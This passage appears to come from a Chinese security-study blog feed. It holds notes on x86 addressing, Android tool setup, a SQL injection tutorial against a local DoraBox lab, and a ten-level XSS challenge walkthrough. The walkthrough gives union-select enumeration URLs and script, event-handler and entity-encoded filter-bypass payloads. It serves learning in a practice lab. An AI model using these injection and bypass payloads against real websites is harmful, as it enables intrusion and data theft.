reg代表寄存器可以是8个通用寄存器中的任意一个</h4><p>读取内存的值:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX]</code></p><p>向内存中写入数据:<br><code>MOV EDX,0x13FFD8MOV DWORD PTR DS:[EDX],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EDX]MOV EAX,DWORD PTR DS:[EDX]</code></p><h4 id="寻址公式三-reg-立即数"><a href="#寻址公式三-reg-立即数" class="headerlink" title="寻址公式三: [reg+立即数]"></a>寻址公式三: [reg+立即数]</h4><p>读取内存的值:<br><code>MOV ECX,0x13FFD0MOV EAX,DWORD PTR DS:[ECX+4]</code></p><p>向内存中写入数据:<br><code>MOV EDX,0x13FFD8MOV DWORD PTR DS:[EDX+0xC].0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EDX+4]MOV EAX,DWORD PTR DS:[EDX+4]</code></p><h4 id="寻址公式四：-reg-reg-（1-or-2-or-4-or-8）"><a href="#寻址公式四：-reg-reg-（1-or-2-or-4-or-8）" class="headerlink" title="寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]"></a>寻址公式四：[reg+reg*（1 or 2 or 4 or 8）]</h4><p>读取内存的值:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4]</code></p><p>向内存中写入数据:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4]</code></p><h4 id="寻址公式五：-reg-reg-（1-or-2-or-4-or-8）-立即数"><a href="#寻址公式五：-reg-reg-（1-or-2-or-4-or-8）-立即数" class="headerlink" title="寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]"></a>寻址公式五：[reg+reg*（1 or 2 or 4 or 8）+立即数]</h4><p>读取内存的值:<br><code>MOV EAX,13FFC4MOV ECX,2MOV EDX,DWORD PTR DS:[EAX+ECX*4+4]</code></p><p>向内存中写入数据:<br><code>MOV EAX,13FFC4MOV ECX,2MOV DWORD PTR DS:[EAX+ECX*4+4],0x87654321</code></p><p>获取内存编号:<br><code>LEA EAX,DWORD PTR DS:[EAX+ECX*4+2]</code></p><h3 id="二、堆栈"><a href="#二、堆栈" class="headerlink" title="二、堆栈"></a>二、堆栈</h3><h4 id="变形的艺术"><a href="#变形的艺术" class="headerlink" title="变形的艺术:"></a>变形的艺术:</h4><h5 id="push-eax代码相当于"><a href="#push-eax代码相当于" class="headerlink" title="push eax代码相当于:"></a>push eax代码相当于:</h5><p><code>lea esp,dword ptr ss:[esp-4]mov dword ptr ss:[esp],eax或者mov dword ptr ss:[esp-4],eaxlea esp,dword ptr ss:[esp-4]还有sub esp,0x4mov dword ptr ss:[esp],eax</code></p><h5 id="push-esp代码相当于："><a href="#push-esp代码相当于：" class="headerlink" title="push esp代码相当于："></a>push esp代码相当于：</h5><p><code>mov dword ptr [esp-4],esp sub esp,0x4</code><br> 还有：</p><p> <code>mov dword ptr [esp-4],esp  lea esp,dword ptr [esp-4]</code></p><h5 id="pop-eax-代码相当于："><a href="#pop-eax-代码相当于：" class="headerlink" title="pop eax 代码相当于："></a>pop eax 代码相当于：</h5><p><code>lea esp,dword ptr [esp+4] mov eax,dword ptr [esp-4]</code></p><p><code>mov eax,dword ptr [esp] lea esp,dword ptr [esp+4]</code></p><h5 id="pop-esp-代码相当于："><a href="#pop-esp-代码相当于：" class="headerlink" title="pop esp 代码相当于："></a>pop esp 代码相当于：</h5><p><code>add esp,0x4 mov esp,dword ptr[esp-4]</code><br>或者</p><p><code>lea esp,dword ptr[esp+4] mov esp,dword ptr[esp-4]</code></p><h4 id="两条简单指令"><a href="#两条简单指令" class="headerlink" title="两条简单指令"></a>两条简单指令</h4><p>stos ：将eax中的值放入edi所指地址的内存里。</p><p>rep ：是重复指令 ecx中放入重复的次数</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>安卓程序分析环境搭建</title>
    <link href="/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"/>
    <url>/2019/09/23/%E5%AE%89%E5%8D%93%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<p>#安卓程序分析环境搭建</p><h2 id="Mac下安卓SDK搭建："><a href="#Mac下安卓SDK搭建：" class="headerlink" title="Mac下安卓SDK搭建："></a>Mac下安卓SDK搭建：</h2><p>前提是已经安装了<strong>homebrew</strong>神器：</p><h3 id="1：下载SDK"><a href="#1：下载SDK" class="headerlink" title="1：下载SDK"></a>1：下载SDK</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">brew </span>search <span class="hljs-keyword">android-sdk</span><span class="hljs-keyword">brew </span>cask <span class="hljs-keyword">install </span><span class="hljs-keyword">android-sdk</span></code></pre></div><h3 id="2：配置环境变量"><a href="#2：配置环境变量" class="headerlink" title="2：配置环境变量"></a>2：配置环境变量</h3><div class="hljs"><pre><code class="hljs undefined">vim .zshrc<span class="hljs-builtin-name">export</span> <span class="hljs-attribute">ANDROID_SDK_ROOT</span>=<span class="hljs-string">"/usr/local/share/android-sdk"</span><span class="hljs-builtin-name">export</span> <span class="hljs-attribute">PATH</span>=<span class="hljs-string">"<span class="hljs-variable">$&#123;PATH&#125;</span>:<span class="hljs-variable">$&#123;ANDROID_SDK_ROOT&#125;</span>/tools:<span class="hljs-variable">$&#123;ANDROID_SDK_ROOT&#125;</span>/platform-tools"</span></code></pre></div><p><code>!wq</code>退出以后，<code>source ~/.zshrc</code></p><div class="hljs"><pre><code class="hljs undefined">pwd<span class="hljs-regexp">/usr/</span>local<span class="hljs-regexp">/share/</span>android-sdk<span class="hljs-regexp">/tools/</span>bin.<span class="hljs-regexp">/sdkmanager</span></code></pre></div><p>然后会出现<code>Warning: File /Users/gjy/.android/repositories.cfg could not be loaded.</code><br>继续<code>touch /Users/gjy/.android/repositories.cfg</code></p><h3 id="3：检验是否搭建好"><a href="#3：检验是否搭建好" class="headerlink" title="3：检验是否搭建好"></a>3：检验是否搭建好</h3><p>在终端输入：<code>android</code><br><img src="/2019/09/23/安卓程序分析环境搭建/images/15692314399452.jpg" srcset="/img/loading.gif" alt="-w706"><br>这就ok了。</p><h2 id="安卓NDK搭建"><a href="#安卓NDK搭建" class="headerlink" title="安卓NDK搭建"></a>安卓NDK搭建</h2><p>前提是已经安装了<strong>homebrew</strong>神器：</p><h3 id="1：下载NDK："><a href="#1：下载NDK：" class="headerlink" title="1：下载NDK："></a>1：下载NDK：</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">brew </span>search <span class="hljs-keyword">android-ndk</span><span class="hljs-keyword">brew </span>cask <span class="hljs-keyword">install </span><span class="hljs-keyword">android-ndk</span></code></pre></div><h3 id="2：配置环境变量："><a href="#2：配置环境变量：" class="headerlink" title="2：配置环境变量："></a>2：配置环境变量：</h3><div class="hljs"><pre><code class="hljs undefined">vim <span class="hljs-string">.zshrc</span>export ANDROID_NDK_HOME=<span class="hljs-string">"/usr/local/share/android-ndk"</span>  <span class="hljs-string">//</span>添加进去正常保存退出source <span class="hljs-string">.zshrc</span></code></pre></div><h3 id="3：检验："><a href="#3：检验：" class="headerlink" title="3：检验："></a>3：检验：</h3><p><code>ndk-build</code><br><img src="/2019/09/23/安卓程序分析环境搭建/images/15692340400478.jpg" srcset="/img/loading.gif" alt="-w751"><br>已经成功了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SQL注入基础学习</title>
    <link href="/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/"/>
    <url>/2019/09/01/SQL%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="SQL注入基础学习"><a href="#SQL注入基础学习" class="headerlink" title="SQL注入基础学习"></a>SQL注入基础学习</h1><h2 id="数据类型（数字型）"><a href="#数据类型（数字型）" class="headerlink" title="数据类型（数字型）"></a>数据类型（数字型）</h2><h3 id="检测是否sql语句是否执行"><a href="#检测是否sql语句是否执行" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><h4 id="使用and-or-xor-like测试"><a href="#使用and-or-xor-like测试" class="headerlink" title="使用and,or,xor,like测试"></a>使用<code>and,or,xor,like</code>测试</h4><ul><li>** 1=1</li><li>** 1=2<br>其中<code>**</code>可以为<code>and or xor like</code>任意一个ps：基本语句，注意真假逻辑关系，灵活进行测试。</li></ul><h4 id="使用符号测试"><a href="#使用符号测试" class="headerlink" title="使用符号测试"></a>使用符号测试</h4><ul><li>单引号</li><li>减号</li></ul><h2 id="数据类型（字符型）"><a href="#数据类型（字符型）" class="headerlink" title="数据类型（字符型）"></a>数据类型（字符型）</h2><h3 id="检测是否sql语句是否执行-1"><a href="#检测是否sql语句是否执行-1" class="headerlink" title="检测是否sql语句是否执行"></a>检测是否sql语句是否执行</h3><p>此处跟数字型测试办法基本一样，还是使用<code>and,or,xor,like</code>、<code>单引号</code>测试。最近接触字符型的注入较少，补充一下原理：</p><p>我们先进行正常查询：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&amp;submit=submit</code><br>当我们给接受处加<code>&#39;</code>：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39;&amp;submit=submit</code>语句执行后，会产生报错：<img src="/2019/09/01/SQL基础学习/images/15673389579474.jpg" srcset="/img/loading.gif" alt><br>然后我们想办法不让其报错，就是来省略后面那个php代码语句加的<code>&#39;</code>:</p><ol><li>用<code>#</code>来注释，但需要进行url来转变一下为<code>%23</code></li><li>用<code>--+</code> <code>--%20</code>来注释<br>然后就可以来用<code>and or xor like</code>来测试了，例如：<code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=1--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15673394738908.jpg" srcset="/img/loading.gif" alt><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_string.php?title=DoraBox&#39; and 1=2--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15673394874987.jpg" srcset="/img/loading.gif" alt></li></ol><h3 id="union知识小记"><a href="#union知识小记" class="headerlink" title="union知识小记"></a>union知识小记</h3><p>union在集合两个select查询语句时，一定要注意<strong>两个查询出来的结果,列数（columns）要相等才会出来结果。</strong><br>例如：<br><img src="/2019/09/01/SQL基础学习/images/15673411551995.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * from news union SELECT 1,2;</code><br><img src="/2019/09/01/SQL基础学习/images/15673412010749.jpg" srcset="/img/loading.gif" alt><br>报错，换成<code>SELECT * from news union SELECT 1,2,3;</code><br><img src="/2019/09/01/SQL基础学习/images/15673412472041.jpg" srcset="/img/loading.gif" alt></p><h3 id="order-by-知识小记"><a href="#order-by-知识小记" class="headerlink" title="order by 知识小记"></a>order by 知识小记</h3><p><code>order by</code>是按照一定规则来进行排序的语句。我们为什么能够通过<code>order by</code>排序，来排出来列名有多少个呢？我们来测试一下：<br><img src="/2019/09/01/SQL基础学习/images/15673428181899.jpg" srcset="/img/loading.gif" alt></p><p><code>SELECT * from test ORDER BY 1;</code><br>当我们在测试到<code>SELECT * from test ORDER BY 5;</code><br><img src="/2019/09/01/SQL基础学习/images/15673428766361.jpg" srcset="/img/loading.gif" alt><br>发现出了异常。<br>我们换个3列的表：<img src="/2019/09/01/SQL基础学习/images/15673429298587.jpg" srcset="/img/loading.gif" alt><br>`SELECT * from news<br>ORDER BY 3;`显示是正常的<br>`SELECT * from news<br>ORDER BY 4;`<img src="/2019/09/01/SQL基础学习/images/15673429733420.jpg" srcset="/img/loading.gif" alt><br>所以可以<strong>发现我们在<code>order by</code>后加数字可以来测出来一个表的列名个数。</strong></p><h3 id="显示联合查询出现的结果"><a href="#显示联合查询出现的结果" class="headerlink" title="显示联合查询出现的结果"></a>显示联合查询出现的结果</h3><p>显示我们自定义查询的结果，该怎么实现呢。<br>先在靶场测试：<code>SELECT * FROM news WHERE id = 2 union select 1,2,3 from test</code><img src="/2019/09/01/SQL基础学习/images/15673503130693.jpg" srcset="/img/loading.gif" alt></p><p>明显网页是不给显示的。相同语句在数据库：<br><img src="/2019/09/01/SQL基础学习/images/15673494870032.jpg" srcset="/img/loading.gif" alt><br>不给显示是因为服务器端php代码进行了处理，只可以显示出一条结果。那如果把第一个查询结果给无法显示，是不是就可以显示我们联合查询的结果呢。先在数据库测试下SQL语句：<code>SELECT * FROM news WHERE id = -1</code><img src="/2019/09/01/SQL基础学习/images/15673498250797.jpg" srcset="/img/loading.gif" alt="-w430"><br>发现是不显示东西的。继续测试:<code>SELECT * FROM news WHERE id = -1 union select 1,2,3 from test;</code><br><img src="/2019/09/01/SQL基础学习/images/15673498938620.jpg" srcset="/img/loading.gif" alt><br>接着我们拿到靶场测试：<img src="/2019/09/01/SQL基础学习/images/15673503981645.jpg" srcset="/img/loading.gif" alt></p><p>达到我们的目的了。看这个页面显示的效果<code>2 3</code>，反向思维考虑把<code>2 3</code>改成我们的列名是不是就可以出数据了，<strong>但是我们如何知道表里的列名呢？</strong></p><h3 id="exists（）函数小记"><a href="#exists（）函数小记" class="headerlink" title="exists（）函数小记"></a>exists（）函数小记</h3><p><code>exists()</code>是验证某个语句是否存在结果，是个bool函数，存在显示<code>1</code>反之是<code>0</code>。<br><code>SELECT * FROM news WHERE id=1 and exists(select * from test);</code>在数据库进行测试:<img src="/2019/09/01/SQL基础学习/images/15673529496971.jpg" srcset="/img/loading.gif" alt><br><code>SELECT * FROM news WHERE id=1 and exists(select * from aa);</code><br><img src="/2019/09/01/SQL基础学习/images/15673532051506.jpg" srcset="/img/loading.gif" alt><br>发现在用这个函数查<strong>不存在的表</strong>的时候语句是没法进行的，然后我们可以通过这个语句来推出表名和列名，不过十分麻烦，<strong>可以通过burpsuit来跑</strong>。还有意外收获，可以看出数据库的名字<img src="/2019/09/01/SQL基础学习/images/15673536538274.jpg" srcset="/img/loading.gif" alt><br>pentest就是数据库的名字了。</p><h2 id="数据类型（搜索型）"><a href="#数据类型（搜索型）" class="headerlink" title="数据类型（搜索型）"></a>数据类型（搜索型）</h2><h3 id="的作用"><a href="#的作用" class="headerlink" title="%的作用"></a><code>%</code>的作用</h3><p><code>%</code>在mysql中表示通配符。在SQL语句中:<br><code>******* like &#39;%a&#39;</code>，就是搜索返回以字母<code>a</code>结尾的所有信息，同理<code>a%</code>%a%`<code>,分别就是 搜索返回以字母</code>a<code>开头的所有信息和搜索返回包含字母</code>a`的所有信息。</p><h3 id="如何注入"><a href="#如何注入" class="headerlink" title="如何注入"></a>如何注入</h3><p>咱们先看下php源代码:<code>$sql_search = &quot;SELECT * FROM {$t_name} WHERE {$c_name} like &#39;%{$c_value}%&#39;&quot;; //search</code><br>很明显提前闭合<code>&#39;%</code>跟省略后面的<code>%&#39;</code>就可以了，所以<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; --+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679129656049.jpg" srcset="/img/loading.gif" alt="-w804"></p><p>然后我们正常走步骤，利用<code>order by</code>来确定下多少列：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 3--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679138962766.jpg" srcset="/img/loading.gif" alt="-w840"><br>继续<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; order by 4--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679139214321.jpg" srcset="/img/loading.gif" alt="-w1022"><br>可以确定是3列了。</p><p>然后开始确定表名，这次用刚刚学的exist()来测试，并且练习一下burp来跑表名和列名：<br>先正常构造payload：<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=d%&#39; and exists(select * from news)--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679141526795.jpg" srcset="/img/loading.gif" alt="-w843"><br>确定news表名存在，然后开始用burp跑其他的：<br><img src="/2019/09/01/SQL基础学习/images/15679142504637.jpg" srcset="/img/loading.gif" alt="-w555"><br><img src="/2019/09/01/SQL基础学习/images/15679143681990.jpg" srcset="/img/loading.gif" alt="-w837"><br>我们是跑表名，所以在<code>news</code>加上变量。这个步骤需要先点<img src="/2019/09/01/SQL基础学习/images/15679145034217.jpg" srcset="/img/loading.gif" alt="-w371"><br>然后<br><img src="/2019/09/01/SQL基础学习/images/15679144276086.jpg" srcset="/img/loading.gif" alt="-w364"><br><img src="/2019/09/01/SQL基础学习/images/15679145997135.jpg" srcset="/img/loading.gif" alt="-w531"><br>在“添加“按钮旁的位置开始填入测试的表名，这个我是手动填的，可以进行导入字典。<img src="/2019/09/01/SQL基础学习/images/15679146928775.jpg" srcset="/img/loading.gif" alt="-w1260"><br><img src="/2019/09/01/SQL基础学习/images/15679147050548.jpg" srcset="/img/loading.gif" alt="-w778"><br>然后我们开始看结果<img src="/2019/09/01/SQL基础学习/images/15679147687971.jpg" srcset="/img/loading.gif" alt="-w666"><br><code>Render</code>下面显示正常就证明是存在的。<br><img src="/2019/09/01/SQL基础学习/images/15679148321357.jpg" srcset="/img/loading.gif" alt="-w963"><br>这个是不存在。最终用这个办法可以跑出表名<code>test、account</code>。同样办法跑列名：<br><img src="/2019/09/01/SQL基础学习/images/15679152029822.jpg" srcset="/img/loading.gif" alt="-w665"></p><p><img src="/2019/09/01/SQL基础学习/images/15679151626020.jpg" srcset="/img/loading.gif" alt="-w797"><br>确定出<code>news</code>表中有<code>id、title、content</code>等列。</p><p>然后我们更新下语句来查表和列，<code>exists()</code>这个办法是有点老的比较笨。<strong>在MySQL&gt;5.1版本中</strong>，<img src="/2019/09/01/SQL基础学习/images/15679322405278.jpg" srcset="/img/loading.gif" alt="-w764"><br>我们可以在<code>information_schema</code>发现这个我们的数据库和列名都可以直接看到，所以我们可以以下语句进行查询：<br>第一步，我们先让其可以显示我们想查询的内容<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,2,3 from news--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679326036385.jpg" srcset="/img/loading.gif" alt="-w904"><br>把标题下的<code>2</code>换成<code>darabase()</code>函数，来显示下数据库的名字。<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,database(),3 from news--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679327628086.jpg" srcset="/img/loading.gif" alt="-w982"><br>然后我们就的得到了<code>pentest</code>，然后开始利用这个mysql&gt;5.1特性来构造语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679330638311.jpg" srcset="/img/loading.gif" alt="-w902"><br>但是在这里面怎么显示其他的名字呢？<img src="/2019/09/01/SQL基础学习/images/15679331040602.jpg" srcset="/img/loading.gif" alt="-w523"><br>继续:<code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39;--+&amp;submit=submit</code>其中可以将<code>!=</code>换成<code>&lt;&gt;</code>是同样的效果。<img src="/2019/09/01/SQL基础学习/images/15679332502596.jpg" srcset="/img/loading.gif" alt="-w916"><br>继续在语句中加<code>and和不等于前面查出的表的名字</code>：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,table_name,3 from information_schema.tables where table_schema=&#39;pentest&#39; and table_name!=&#39;account&#39; and table_name&lt;&gt;&#39;news&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679333657212.jpg" srcset="/img/loading.gif" alt="-w989"><br><strong>我们发现这样很繁琐，如何能够让一下子全部显示出来呢，用到了<code>group_cancat()</code>函数：</strong><br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><img src="/2019/09/01/SQL基础学习/images/15679337786295.jpg" srcset="/img/loading.gif" alt="-w1028"></p><p>然后我们继续去查列名，然后转到<code>infromation_schema</code>的<code>columns</code>下，一直搜索<code>account</code>下滑发现，我们在这个列表下可以拿到更全的信息：<br><img src="/2019/09/01/SQL基础学习/images/15679344981875.jpg" srcset="/img/loading.gif" alt="-w1162"></p><p>去对比下<code>account</code>表下的列名信息：<br><img src="/2019/09/01/SQL基础学习/images/15679342199859.jpg" srcset="/img/loading.gif" alt="-w189"><br>是相对应的，所以我们可以更改下语句：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(table_name),3 from information_schema.columns where table_schema=&#39;pentest&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679346900575.jpg" srcset="/img/loading.gif" alt="-w1012"><br>发现我们还可以拿到这个表名，对比数据库我们也可以按照表名出现的个数看出其表下有多少列。然后我们拿<code>news</code>测试下获取列名：<br><code>http://127.0.0.1/DoraBox/sql_injection/sql_search.php?content=mmmmmm%&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;pentest&#39; and table_name=&#39;news&#39;--+&amp;submit=submit</code><br><img src="/2019/09/01/SQL基础学习/images/15679349902804.jpg" srcset="/img/loading.gif" alt="-w1049"></p>]]></content>
    
    
    
    <tags>
      
      <tag>SQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS挑战之旅</title>
    <link href="/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
    <url>/2019/08/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
    
    <content type="html"><![CDATA[<h1 id="XSS挑战之旅"><a href="#XSS挑战之旅" class="headerlink" title="XSS挑战之旅"></a>XSS挑战之旅</h1><h2 id="关卡"><a href="#关卡" class="headerlink" title="关卡"></a>关卡</h2><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><p>payload:<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668211760590.jpg?raw=true" srcset="/img/loading.gif" alt><br>此题没有任何过滤，直接构造语句，在标签之间进行输出。</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668215829302.jpg?raw=true" srcset="/img/loading.gif" alt><br>此题变成了<code>&lt;input&gt;</code>标签，看到此处后可以考虑，提前闭合掉这个标签，所以构造payload：<code>&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</code>，<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221905952.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>或者也可以payload：<code>&quot; onclick=alert(1)&gt;</code>这个需要点击搜索后，再点击搜索框，属于借助js事件类型。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668221627239.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668225398647.jpg?raw=true" srcset="/img/loading.gif" alt><br>变成了单引号的input标签，先尝试闭合input标签这个思路。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227235348.jpg?raw=true" srcset="/img/loading.gif" alt><br>发现没有过去，去看下网页代码。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668227746468.jpg?raw=true" srcset="/img/loading.gif" alt><br>发现其过滤了<code>&lt; &gt;</code>,这样只能通过js事件来构造弹窗。<br>跟上题一样，不过此处是单引号，所以构造payload：<br><code>&#39; onclick=&#39;alert(1)</code><br>注意此处的<code>alert(1)</code>的前面还有个单引号，其效果就是<code>value=&#39;&#39; onclick=&#39;alert(1)&#39;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15668232441274.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669039155180.jpg?raw=true" srcset="/img/loading.gif" alt><br>查看网页源代码，还是跟上题差不多，不过是单引号换成了双引号。按照原来的思路，构造payload：<br><code>&quot; onclick=&quot;alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669038872074.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>看网页源代码，跟上题一样，直接先测试上题的payload。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669042011764.jpg?raw=true" srcset="/img/loading.gif" alt><br><code>&lt;input name=keyword  value=&quot;&quot; o_nclick=&quot;alert(1)&quot;&gt;</code>再次查看，可以看出对on进行了过滤，在尝试双写、改变大小写无果后。换思路看看<code>&lt; &gt;</code>是否过滤，发现没有过滤。然后考虑先闭合input标签，然后构造个超链接，点击后调用js事件。<br>payload=<code>&quot;&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br>然后点击就ok了。</p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>第六关直接测试上题的payload，无法通过，然后看网页源代码：<br><code>&lt;input name=keyword  value=&quot;&quot;&gt; &lt;a hr_ef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;&quot;&gt;</code><br>发现href遭到了过滤，结果发现改变大小写可以绕过。<br>payload：<code>&quot;&gt; &lt;a hRef=&quot;javascript:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669054032946.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h3><p>还是先测试上题的payload，然后查看源代码，发现：<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669056409336.jpg?raw=true" srcset="/img/loading.gif" alt><br>href与script直接被替换成了空，然后考虑双写绕过，构造payload：<code>&quot;&gt; &lt;a hrhrefef=&quot;javascriscriptpt:alert(1)&quot;&gt;1&lt;/a&gt;</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669055755331.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060160351.jpg?raw=true" srcset="/img/loading.gif" alt><br>发现有些不一样了，然后先点下”添加友情链接“按钮，去看下网页源代码。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669060975749.jpg?raw=true" srcset="/img/loading.gif" alt><br>会发现这个题是在这个地方来进行xss攻击。先构造payload：<code>javascript:alert(1)</code>，无法通过，然后查看源代码<code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascr_ipt:alert(1)&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;</code>可以发现其过滤了字符串script，因为此处为html标记语言，考虑把”r”转换为HTML实体来绕过。<br>构造payload：<code>javasc&amp;#114;ipt:alert(1)</code><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669059745275.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669066979885.jpg?raw=true" srcset="/img/loading.gif" alt><br>这题还是跟上题一个类型，但是发现不管加入什么都显示这个。不如加入个正常合法链接试一试，<code>http://www.baidu.com</code>,发现显示正常了，经过测试后发现其在检测到<code>http://</code>后才会正常显示你的代码。所以构造payload：<code>javasc&amp;#114;ipt:alert(1)//http://</code><br>注意”//“这个是来注释后面的代码的。<br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669068046610.jpg?raw=true" srcset="/img/loading.gif" alt></p><h3 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h3><p><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669071677201.jpg?raw=true" srcset="/img/loading.gif" alt><br>进来以后发现无任何可输入的地方，然后就查看源代码<img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669072118291.jpg?raw=true" srcset="/img/loading.gif" alt></p><p>发现其type类型全是hidden，然后考虑是不是考察这个知识点，在查询后发现大多解决办法就是把hidden，改为text类型。因为在浏览器get到<code>type=”***“</code>，即可把原来的type给替换所以考虑构造payload：<br><code>&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br>然后会出现个输入框，点击后即可过关。<strong>此处需要注意的是查看源代码后发现有三个input标签，但实际测试只有最后一个<code>name=&quot;t_sort&quot;</code>才会出现文本框，所以构造了以最后一个标签为攻击点的payload。</strong><br><img src="https://github.com/chumen77/chumen77.github.io/blob/master/images/15669081314821.jpg?raw=true" srcset="/img/loading.gif" alt><br><img 